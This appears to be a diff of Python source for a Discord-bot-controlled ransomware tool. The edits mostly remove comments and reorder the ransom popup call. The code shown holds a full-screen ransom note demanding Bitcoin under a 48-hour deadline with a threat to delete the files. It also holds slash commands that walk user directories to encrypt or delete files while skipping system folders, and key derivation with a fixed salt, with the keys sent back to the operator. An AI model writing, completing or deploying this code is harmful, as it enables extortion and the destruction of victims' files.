@@ -45,8 +45,8 @@ slash = SlashCommand(client, sync_commands=True)
 
 def password(passwd):
     
-    password = passwd.encode() # Convert to type bytes
-    salt = b'salt_' # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
+    password = passwd.encode() 
+    salt = b'salt_' 
     kdf = PBKDF2HMAC(
     algorithm=hashes.SHA256(),
     length=32,
@@ -87,58 +87,58 @@ def dec_fun(key,file):
 def spam_messagebox():
 
     root= tk.Tk()
-    width = root.winfo_screenwidth() # Get screen width
-    height = root.winfo_screenheight() # Get screen height
+    width = root.winfo_screenwidth() 
+    height = root.winfo_screenheight() 
 
 
-    canvas1 = tk.Canvas(root, width = width, height = height, bg='black') # Main window
+    canvas1 = tk.Canvas(root, width = width, height = height, bg='black') 
     canvas1.pack()
 
-    label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') # Title
+    label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') 
     label1.config(font=('helvetica', int(height/20)))
     label1.config(background='black', foreground='red')
     canvas1.create_window(int(width/2), int(height/15), window=label1)
 
 
-    label1 = tk.Label(root, text=f'YOUR DIGITS ARE {digits}') # Title
+    label1 = tk.Label(root, text=f'YOUR DIGITS ARE {digits}') 
     label1.config(font=('helvetica', int(height/50)))
     label1.config(background='black', foreground='red')
     canvas1.create_window(int(width/2), int(height/20)*4, window=label1)
 
 
-    label1 = tk.Label(root, text='YOUR IMPORTANT PROGRAMS, DOCUMENTS, DATAS, PHOTOS, SCRIPTS, SOURCE CODE AND VIDEOS') # Title
+    label1 = tk.Label(root, text='YOUR IMPORTANT PROGRAMS, DOCUMENTS, DATAS, PHOTOS, SCRIPTS, SOURCE CODE AND VIDEOS') 
     label1.config(font=('helvetica', int(height/50)))
     label1.config(background='black', foreground='red')
     canvas1.create_window(int(width/2), int(height/20)*6, window=label1)
 
 
-    label1 = tk.Label(root, text='HAVE BEEN ENCRYPTED WITH HIGH GRADE MILITARY ENCRYPTION.') # Title
+    label1 = tk.Label(root, text='HAVE BEEN ENCRYPTED WITH HIGH GRADE MILITARY ENCRYPTION.') 
     label1.config(font=('helvetica', int(height/50)))
     label1.config(background='black', foreground='red')
     canvas1.create_window(int(width/2), int(height/20)*7, window=label1)
 
 
-    label1 = tk.Label(root, text='YOU ONLY HAVE 48 HOURS TO SUBMIT THE PAYMENT, AFTER THAT THE PRICE WILL BE DOUBLED') # Subtitle
+    label1 = tk.Label(root, text='YOU ONLY HAVE 48 HOURS TO SUBMIT THE PAYMENT, AFTER THAT THE PRICE WILL BE DOUBLED') 
     label1.config(font=('helvetica', int(height/50)))
     label1.config(background='black', foreground='red')
     canvas1.create_window(int(width/2), int(height/20)*8, window=label1)
 
 
-    label1 = tk.Label(root, text='If you do not pay within 5 days, your files will be deleted forever') # Subtitle
+    label1 = tk.Label(root, text='If you do not pay within 5 days, your files will be deleted forever') 
     label1.config(font=('helvetica', int(height/50)))
     label1.config(background='black', foreground='red')
     canvas1.create_window(int(width/2), int(height/20)*9, window=label1)
 
 
-    label1 = tk.Label(root, text=f'to decrypt them, send {ransom_price} in BITCOIN to') # Blackmail ammount
+    label1 = tk.Label(root, text=f'to decrypt them, send {ransom_price} in BITCOIN to')
     label1.config(font=('helvetica', int(height/50)))
     label1.config(background='black', foreground='red')
     canvas1.create_window(int(width/2), int(height/20)*11, window=label1)
 
     
-    labelBTC = tk.Label(root, text=f"{btc_address}") # Change this to your BTC address
-    labelBTC.config(font=('helvetica', int(height/50))) # Size
-    labelBTC.config(background='black', foreground='red') # Colors
+    labelBTC = tk.Label(root, text=f"{btc_address}") 
+    labelBTC.config(font=('helvetica', int(height/50))) 
+    labelBTC.config(background='black', foreground='red') 
     canvas1.create_window(int(width/2), int(height/20)*13, window=labelBTC)
                                                 # *13 means how far down the canvas the subtitle is!
 
@@ -295,13 +295,13 @@ async def EncryptFiles_command(ctx: SlashContext, userdir: str):
                 if os.path.isfile(file_input)==False:
                     for (dirpath, dirnames, filenames) in os.walk(file_input):
                         EXCLUDE_DIRECTORY = (
-                            #Mac/Linux system directory
+                            
                             '/usr',  
                             '/Library/',
                             '/System',
                             '/Applications',
                             '.Trash',
-                            #Windows system directory
+                            
                             'Program Files',
                             'Program Files (x86)',
                             'Windows',
@@ -361,13 +361,13 @@ async def DeleteFiles_command(ctx: SlashContext, usersdir: str):
                 if os.path.isfile(file_input)==False:
                         for (dirpath, dirnames, filenames) in os.walk(file_input):
                             EXCLUDE_DIRECTORY = (
-                                #Mac/Linux system directory
+                                
                                 '/usr',  
                                 '/Library/',
                                 '/System',
                                 '/Applications',
                                 '.Trash',
-                                #Windows system directory
+                                
                                 'Program Files',
                                 'Program Files (x86)',
                                 'Windows',
@@ -481,13 +481,13 @@ async def EncryptAll_command(ctx: SlashContext):
                     if os.path.isfile(file_input)==False:
                         for (dirpath, dirnames, filenames) in os.walk(file_input):
                             EXCLUDE_DIRECTORY = (
-                                #Mac/Linux system directory
+                                
                                 '/usr',  
                                 '/Library/',
                                 '/System',
                                 '/Applications',
                                 '.Trash',
-                                #Windows system directory
+                                
                                 'Program Files',
                                 'Program Files (x86)',
                                 'Windows',
@@ -556,13 +556,13 @@ async def EncryptAll_command(ctx: SlashContext):
                     if os.path.isfile(file_input)==False:
                         for (dirpath, dirnames, filenames) in os.walk(file_input):
                             EXCLUDE_DIRECTORY = (
-                                #Mac/Linux system directory
+                                
                                 '/usr',  
                                 '/Library/',
                                 '/System',
                                 '/Applications',
                                 '.Trash',
-                                #Windows system directory
+                                
                                 'Program Files',
                                 'Program Files (x86)',
                                 'Windows',
@@ -631,13 +631,13 @@ async def EncryptAll_command(ctx: SlashContext):
                     if os.path.isfile(file_input)==False:
                         for (dirpath, dirnames, filenames) in os.walk(file_input):
                             EXCLUDE_DIRECTORY = (
-                                #Mac/Linux system directory
+                                
                                 '/usr',  
                                 '/Library/',
                                 '/System',
                                 '/Applications',
                                 '.Trash',
-                                #Windows system directory
+                                
                                 'Program Files',
                                 'Program Files (x86)',
                                 'Windows',
@@ -706,13 +706,13 @@ async def EncryptAll_command(ctx: SlashContext):
                     if os.path.isfile(file_input)==False:
                         for (dirpath, dirnames, filenames) in os.walk(file_input):
                             EXCLUDE_DIRECTORY = (
-                                #Mac/Linux system directory
+                                
                                 '/usr',  
                                 '/Library/',
                                 '/System',
                                 '/Applications',
                                 '.Trash',
-                                #Windows system directory
+                                
                                 'Program Files',
                                 'Program Files (x86)',
                                 'Windows',
@@ -781,13 +781,13 @@ async def EncryptAll_command(ctx: SlashContext):
                     if os.path.isfile(file_input)==False:
                         for (dirpath, dirnames, filenames) in os.walk(file_input):
                             EXCLUDE_DIRECTORY = (
-                                #Mac/Linux system directory
+                                
                                 '/usr',  
                                 '/Library/',
                                 '/System',
                                 '/Applications',
                                 '.Trash',
-                                #Windows system directory
+                                
                                 'Program Files',
                                 'Program Files (x86)',
                                 'Windows',
@@ -856,13 +856,13 @@ async def EncryptAll_command(ctx: SlashContext):
                     if os.path.isfile(file_input)==False:
                         for (dirpath, dirnames, filenames) in os.walk(file_input):
                             EXCLUDE_DIRECTORY = (
-                                #Mac/Linux system directory
+                                
                                 '/usr',  
                                 '/Library/',
                                 '/System',
                                 '/Applications',
                                 '.Trash',
-                                #Windows system directory
+                                
                                 'Program Files',
                                 'Program Files (x86)',
                                 'Windows',
@@ -932,13 +932,13 @@ async def EncryptAll_command(ctx: SlashContext):
                     if os.path.isfile(file_input)==False:
                         for (dirpath, dirnames, filenames) in os.walk(file_input):
                             EXCLUDE_DIRECTORY = (
-                                #Mac/Linux system directory
+                                
                                 '/usr',  
                                 '/Library/',
                                 '/System',
                                 '/Applications',
                                 '.Trash',
-                                #Windows system directory
+                                
                                 'Program Files',
                                 'Program Files (x86)',
                                 'Windows',
@@ -1008,13 +1008,13 @@ async def EncryptAll_command(ctx: SlashContext):
                     if os.path.isfile(file_input)==False:
                         for (dirpath, dirnames, filenames) in os.walk(file_input):
                             EXCLUDE_DIRECTORY = (
-                                #Mac/Linux system directory
+                                
                                 '/usr',  
                                 '/Library/',
                                 '/System',
                                 '/Applications',
                                 '.Trash',
-                                #Windows system directory
+                                
                                 'Program Files',
                                 'Program Files (x86)',
                                 'Windows',
@@ -1081,8 +1081,8 @@ async def EncryptAll_command(ctx: SlashContext):
             await ctx.send(content="Booting up auto encrypter, Please wait. . .", hidden=True)
             C_drive_desktop() # Start auto encrypter
             download_decrypter() # Download decrypter
-            spam_messagebox() # Send message box
             await ctx.send(f"```Finished encrypted everything and sent message box```\n\n**Here are the keys to decrypt the files!**\n{json.dumps(PASSWORDS, indent=6)}")
+            spam_messagebox() # Send message box
         else:
             await ctx.send(content="Cancelled!", hidden=True)
         
